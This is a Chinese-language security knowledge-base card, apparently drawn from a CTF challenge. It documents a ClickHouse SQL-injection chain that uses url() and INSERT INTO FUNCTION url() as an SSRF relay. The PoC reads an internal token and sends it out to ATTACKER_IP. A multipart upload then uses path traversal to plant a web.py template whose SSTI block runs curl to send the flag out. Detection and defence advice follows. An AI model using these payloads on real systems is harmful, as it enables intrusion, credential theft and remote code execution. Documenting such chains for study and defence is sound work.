---
id: web-generic-ssrf-clickhouse-sqli-url-function-multistep-relay
title: ClickHouse SQL 注入经 url() 表函数多步中继：盲读内网 API + INSERT INTO FUNCTION url() 构造 POST 上传
type: scenario
domain: web
path: web/generic/ssrf
technique: clickhouse-url-function-sqli-multistep-relay
aliases:
- ClickHouse 注入 SSRF
- url() 表函数请求中继
- INSERT INTO FUNCTION url
- ClickHouse SSRF 外带
- ClickHouse 打内网 API
tags:
- clickhouse
- sqli
- ssrf
- url-function
- insert-into-function
- internal-network
- ctf
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-12'
updated: '2026-11-12'
verification:
  verified_by: verifier-V569
  verified_at: '2026-11-12T09:28:47+08:00'
  notes: '已对照原文源码与 PoC 核对：/query id 拼接注入、/api/token 仅 REMOTE_ADDR 172.28.0.0/16、url() 嵌套+||hex() 外带、INSERT INTO FUNCTION url+headers 发 multipart 上传、filename=../templates/test.html 穿越与 web.py $code: SSTI 均与原文一致；原文整链 payload 多层 URL 编码，卡内注明需按环境编码。未实跑复现。'
---

## 一句话结论

当 ClickHouse 查询的拼接注入点可控时，`url()` 表函数可把数据库主机变成 SSRF 中继：内层 `url()` 读取内网 API（如仅对 172.16/12 开放的 token 接口），外层用 `|| hex(...)` 把响应外带到攻击者服务器；`INSERT INTO FUNCTION url(...)` 还能带自定义 headers 发 multipart POST，调用内部上传接口写文件，最终与上传穿越、模板注入组成 RCE 链。

## 原理

- `url()` 表函数在 ClickHouse 服务端发起 HTTP 请求，SELECT 用 GET、INSERT 用 POST，请求源地址是数据库主机，因此能访问仅内网可达、外部攻击者直达不了的接口。
- 注入点为字符串拼接（如 `SELECT * FROM web.users WHERE id = ` + id）时，`id=1 and (SELECT * FROM url('http://attacker/?a='||hex((SELECT * FROM url('http://backend:8001/api/token','TabSeparatedRaw','x String'))),'TabSeparatedRaw','x String'))`：内层请求内网 token 接口，`hex()` 把响应编码，`||` 拼进外层 URL 的查询串，攻击者 VPS 的访问日志即拿到 token。
- 写方向：`INSERT INTO FUNCTION url('http://backend:8001/api/upload','TabSeparatedRaw','x String', headers('Content-Type'='multipart/form-data; boundary=----test','X-Access-Token'='<token>')) VALUES ('<multipart body>')` 让 ClickHouse 以指定 headers 发起 POST，body 由 VALUES 完全可控，可模拟任意表单上传。
- 内网接口只按 `REMOTE_ADDR` 判断来源（如 `172.28.0.0/16`）并校验 token：ClickHouse 容器就在该网段内，所以来自数据库的请求被信任；token 又刚被读取外带，两个条件同时满足。
- 上传接口用 `os.path.join('upload/', files.myfile.filename)` 拼接原始文件名，未过滤 `../`，`filename="../templates/test.html"` 即目录穿越写入模板目录；目标框架按模板名动态渲染（如 web.py `render.__getattr__(data.name)()`），模板中的 `$code:` 块执行 Python 代码，构成 SSTI RCE。

## 触发条件

- 应用存在 SQL 拼接注入，且注入语句可执行子查询与表函数；
- ClickHouse 的 `url()` 表函数可用（未禁 SOURCES 权限），数据库主机能访问目标内网；
- 目标内部 API 的信任模型是"源 IP 在网段内 + token"，而 ClickHouse 主机恰在信任网段内；
- 注入入口可达（如通过 nginx 路径解析差异访问到被隐藏的路由），且下游存在可写目录/模板注入点。

## 利用步骤

1. 确认注入：`id=1 and 1=1` / `id=1 and 1=2` 或时间/布尔差异。
2. 读 token：用 `url()` 嵌套 + `|| hex()` 把 `/api/token` 的响应外带到攻击者 HTTP 服务，查看访问日志或响应。
3. 构造上传：用 `INSERT INTO FUNCTION url('http://backend:8001/api/upload', ..., headers('Content-Type'='multipart/form-data; boundary=----test','X-Access-Token'='<token>'))`，VALUES 内放完整 multipart body，filename 用 `../templates/test.html`。
4. 等待写入后访问模板文件触发 SSTI：`$code:` 块内执行 `__import__('os').system('...')`。
5. 通过命令外带（curl DNS/HTTP）或直接回显读取 flag；若模板需要请求触发，注意渲染路径与参数名。

## PoC

```sql
-- 读内网 token（外带到攻击者 VPS 的查询串）
SELECT * FROM url('http://ATTACKER_IP:PORT/?a='||hex((SELECT * FROM url('http://backend:8001/api/token','TabSeparatedRaw','x String'))),'TabSeparatedRaw','x String');

-- 以 multipart POST 调内部上传接口（template 注入点）
INSERT INTO FUNCTION url('http://backend:8001/api/upload','TabSeparatedRaw','x String',
  headers('Content-Type'='multipart/form-data; boundary=----test','X-Access-Token'='<token>'))
VALUES ('------test\r\nContent-Disposition: form-data; name="myfile"; filename="../templates/test.html"\r\nContent-Type: text/plain\r\n\r\n$code:\r\n    __import__(''os'').system(''curl http://ATTACKER_IP:PORT/?flag=`/readflag|base64`'')\r\n------test--');
```

实际发送时 payload 需 URL 编码后放入 `id` 参数（原题因编码层数多，cookie/ID 参数中出现了 `%25` 双重编码）。

## 变体与关联

- 变体：读方向可换成 `s3()`/`hdfs()` 访问对象存储；写方向也可用 `INTO OUTFILE`（已有卡 [[pentest-privilege-escalation-clickhouse-into-outfile]]），但 `INSERT INTO FUNCTION url()` 的优势是能借数据库身份访问内网 HTTP 接口。
- 关联：ClickHouse 表函数读方向 SSRF [[web-generic-ssrf-clickhouse-url-s3-hdfs-cloud-metadata]]；ClickHouse 盲注技巧 [[web-generic-sqli-clickhouse-from-first-intersect-join-blind]]；入口路由绕过见 [[web-generic-auth-nginx-request-line-path-normalization-bypass]]；web.py 模板写入 + SSTI 链（见本卡利用步骤）。
- 变体：多步交互中每一步都经数据库发起，攻击者与内网无直接连通，传统 SSRF 的"仅 GET 探测"被扩展为"读写复合"。

## 检测与防御

- 检测：ClickHouse 查询日志中出现 `url(`、`INSERT INTO FUNCTION`、`hex(`、`||` 与内网地址组合；数据库主机对业务内网接口的异常出站与频繁请求；上传目录/templates 目录出现非预期文件。
- 防御：参数化 SQL 与 ORM；限制 `url` 表函数与 SOURCES 权限、禁用 `INSERT INTO FUNCTION`；内网接口不要只信任源 IP（增加 mTLS/签名/会话）；上传文件名用 basename 与白名单并禁止 `../`；模板目录不可写。
